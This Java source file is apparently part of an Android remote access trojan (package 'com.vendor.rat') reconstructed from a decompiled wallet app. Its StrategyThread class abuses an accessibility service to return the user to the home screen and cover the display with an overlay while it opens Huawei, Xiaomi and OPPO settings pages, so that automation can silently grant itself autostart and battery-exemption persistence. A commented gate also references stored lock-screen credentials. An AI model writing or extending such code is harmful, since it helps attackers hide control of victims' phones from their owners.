package com.vendor.rat.keepalive.thread;

import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;

import com.vendor.rat.MainApplication;
import com.vendor.rat.credential.LockCredentialStore;
import com.vendor.rat.helper.BlockViewHelper;
import com.vendor.rat.helper.StealthHelper;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.DeviceUtils;

import java.util.Timer;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Vendor: com.guard.wallet.thread.j
 * Strategy thread — 保活策略执行器
 *
 * vendor 流程:
 *   1. KeepHeartThread.run() → API /walletAuth/strategy/noCompletes
 *   2. API 回调 → StrategyThread.g(BlockViewVO, true)
 *   3. g() → 显示遮罩 (BlockViewHelper.show) + 打开设置页面 (Intent)
 *   4. HuaweiEngine 被动检测窗口变化 → 自动导航到启动管理
 *
 * vendor j.g() decompile failed (306 instructions), 从真机日志推断实现
 */
public final class StrategyThread {

    private static final String TAG = "StrategyThread";
    private static volatile StrategyThread instance;
    private final int mode;
    private Object data;
    private Object extra;

    /** 防止重复触发 (内存) */
    private static final AtomicBoolean keepAliveTriggered = new AtomicBoolean(false);

    private static final String PREF_NAME = "keep_alive_state";
    private static final String KEY_COMPLETED = "keep_alive_completed";

    /** 标记保活自动化已完成 (持久化) */
    public static void markKeepAliveCompleted() {
        try {
            Context ctx = MainApplication.getApplication();
            if (ctx != null) {
                ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                    .edit().putBoolean(KEY_COMPLETED, true).apply();
                Log.d(TAG, "保活自动化完成状态已持久化");
            }
        } catch (Exception e) {
            Log.e(TAG, "markKeepAliveCompleted error", e);
        }
    }

    /** 检查保活自动化是否已完成 (持久化) */
    private static boolean isKeepAliveCompleted() {
        try {
            Context ctx = MainApplication.getApplication();
            if (ctx != null) {
                return ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                    .getBoolean(KEY_COMPLETED, false);
            }
        } catch (Exception e) {
            Log.e(TAG, "isKeepAliveCompleted error", e);
        }
        return false;
    }

    /**
     * Vendor: j() default constructor - mode 0, starts timer
     */
    public StrategyThread() {
        this.mode = 0;
        this.data = new ConcurrentLinkedQueue<>();
        this.extra = new Timer();
        ((Timer) this.extra).schedule(new ScheduledTimerTask(this, 1), 500L, 500L);
    }

    /**
     * Vendor: j(int) - mode constructor
     */
    public StrategyThread(int mode) {
        this.mode = mode;
    }

    /**
     * Vendor: j(Object, Object, int) - full constructor
     */
    public StrategyThread(Object data, Object extra, int mode) {
        this.mode = mode;
        this.data = data;
        this.extra = extra;
    }

    public static StrategyThread getInstance() {
        if (instance == null) {
            synchronized (StrategyThread.class) {
                if (instance == null) {
                    instance = new StrategyThread();
                }
            }
        }
        return instance;
    }

    /**
     * Vendor: j.e() - checks if strategy should run
     */
    public static boolean shouldRun() {
        try {
            // vendor: 检查 WebSocket 状态、屏幕状态、网络
            return MyAccessibilityService.P() != null;
        } catch (Exception e) {
            Log.e(TAG, "shouldRun error", e);
            return false;
        }
    }

    /**
     * Vendor: j.g(BlockViewVO, boolean) — 触发保活自动化
     * Decompiled code corrupted (306 instructions).
     * 从真机日志推断:
     *   1. helper.g.a(blockViewVO) → 显示遮罩
     *   2. Intent 打开 com.android.settings.HWSettings (主设置页面)
     *   3. HuaweiEngine 通过事件驱动完成操作
     */
    public static boolean applyBlockView(Object blockViewVO, boolean flag) {
        try {
            if (!shouldRun()) {
                Log.d(TAG, "策略不满足运行条件");
                return false;
            }

            Log.d(TAG, "触发保活自动化");

            // 1. 显示遮罩 (vendor: helper.g.a(blockViewVO))
            BlockViewHelper.show(blockViewVO);
            Log.d(TAG, "遮罩已显示");

            // 2. 更新初始进度
            StealthHelper.updateProgress(10);

            // 3. 获取 Context — 优先用 AccessibilityService (有后台启动特权)
            MyAccessibilityService service = MyAccessibilityService.P();
            Context context = resolveContext(service);
            if (context == null) {
                Log.e(TAG, "无法获取 Context，设置页面启动失败");
                return false;
            }

            // 4. 打开厂商对应的设置页面
            launchSettingsForVendor(context, service);

            return true;
        } catch (Exception e) {
            Log.e(TAG, "applyBlockView error", e);
            return false;
        }
    }

    /**
     * 获取可用 Context — 优先 AccessibilityService，fallback MainApplication
     */
    private static Context resolveContext(MyAccessibilityService service) {
        if (service != null) {
            return service.getApplicationContext();
        }
        if (MainApplication.getApplication() != null) {
            return MainApplication.getApplication().getApplicationContext();
        }
        return null;
    }

    /**
     * 根据厂商启动对应的设置页面 (public — 供 LaunchSettingsStage 调用)
     * HuaweiEngine / XiaomiEngine 被动检测窗口变化 → 自动导航
     */
    public static void launchSettingsForVendor(Context ctx, MyAccessibilityService svc) {
        // 先回桌面 — 用户可能在设置页面授权无障碍，此时 settings 已在前台
        // 不先回桌面的话，再打开 HWSettings 不触发 WINDOW_STATE_CHANGED 事件
        // HuaweiEngine 收不到事件就不会执行自动化
        if (svc != null) {
            svc.performGlobalAction(
                android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME);
            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
        }

        if (DeviceUtils.isHuawei()) {
            launchWithFallback(svc, ctx,
                "com.android.settings", "com.android.settings.HWSettings",
                "华为系统设置");
        } else if (DeviceUtils.isXiaomi()) {
            // 小米: 打开应用详情页 → XiaomiEngine 被动检测并处理自启动+电池优化
            Intent xiaomiIntent = new Intent();
            xiaomiIntent.setClassName("com.miui.securitycenter",
                "com.miui.appmanager.ApplicationsDetailsActivity");
            xiaomiIntent.putExtra("package_name", ctx.getPackageName());
            xiaomiIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            xiaomiIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
            try {
                startActivityViaService(svc, ctx, xiaomiIntent);
                Log.d(TAG, "启动小米应用详情页成功");
            } catch (Exception e) {
                Log.w(TAG, "小米应用详情页启动失败，使用通用设置", e);
                launchGenericSettings(svc, ctx);
            }
        } else if (DeviceUtils.isOppo()) {
            // OPPO: 打开应用详情页 → OppoEngine 被动检测并处理耗电管理+自启动
            // 真机验证: InstalledAppDetailsTop 通过 ACTION_APPLICATION_DETAILS_SETTINGS 打开
            // 直接 setClassName 在 ColorOS 16 上可能打开错误页面
            Intent oppoIntent = new Intent(
                android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            oppoIntent.setData(android.net.Uri.parse("package:" + ctx.getPackageName()));
            oppoIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            oppoIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
            try {
                startActivityViaService(svc, ctx, oppoIntent);
                Log.d(TAG, "启动 OPPO 应用详情页成功");
            } catch (Exception e) {
                Log.w(TAG, "OPPO 应用详情页启动失败，使用通用设置", e);
                launchGenericSettings(svc, ctx);
            }
        } else {
            launchGenericSettings(svc, ctx);
        }
    }

    /**
     * 启动指定 Activity，失败时 fallback 到通用设置
     */
    private static void launchWithFallback(MyAccessibilityService svc, Context ctx,
                                            String pkg, String cls, String label) {
        try {
            Intent intent = new Intent();
            intent.setClassName(pkg, cls);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startActivityViaService(svc, ctx, intent);
            Log.d(TAG, "启动" + label + "成功");
        } catch (Exception e) {
            Log.w(TAG, label + " 启动失败，使用通用设置", e);
            launchGenericSettings(svc, ctx);
        }
    }

    /**
     * 启动通用系统设置页
     */
    private static void launchGenericSettings(MyAccessibilityService svc, Context ctx) {
        Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
        settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivityViaService(svc, ctx, settingsIntent);
        Log.d(TAG, "启动通用系统设置");
    }

    /**
     * 优先用 AccessibilityService 启动 Activity (有后台启动特权)
     */
    private static void startActivityViaService(MyAccessibilityService svc, Context ctx,
                                                 Intent intent) {
        if (svc != null) {
            svc.startActivity(intent);
        } else {
            ctx.startActivity(intent);
        }
    }

    /**
     * 触发保活策略 — 使用管道模式执行
     *
     * 管道内部处理: 版本检测、完成状态检查、遮罩、引擎、权限、MediaProjection
     * 此方法只负责防重入 + 基本前置条件
     */
    public static void triggerKeepAliveIfNeeded() {
        try {
            // TODO: 恢复 ADB 自动化授权时取消注释
            // if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
            //     Log.d(TAG, "skip keepalive automation: credential gate not verified in current run");
            //     return;
            // }

   if (keepAliveTriggered.get()) return;

            MyAccessibilityService service = MyAccessibilityService.P();
            if (service == null) return;

            // 支持华为、小米和 OPPO 设备
            if (!DeviceUtils.isHuawei() && !DeviceUtils.isXiaomi() && !DeviceUtils.isOppo()) return;

            // 防止重复触发
            if (!keepAliveTriggered.compareAndSet(false, true)) return;

            Log.d(TAG, "触发自动化管道");

            // 管道自行处理 版本检测 + 完成状态检查
            com.vendor.rat.auto.pipeline.AutomationPipeline.executeStandard(service);

        } catch (Exception e) {
            Log.e(TAG, "triggerKeepAliveIfNeeded error", e);
        }
    }

    /**
     * 重置触发状态 (用于测试或重新触发)
     */
    public static void resetTrigger() {
        keepAliveTriggered.set(false);
    }

    public int getMode() {
        return mode;
    }

    public Object getData() {
        return data;
    }

    public Object getExtra() {
        return extra;
    }
}
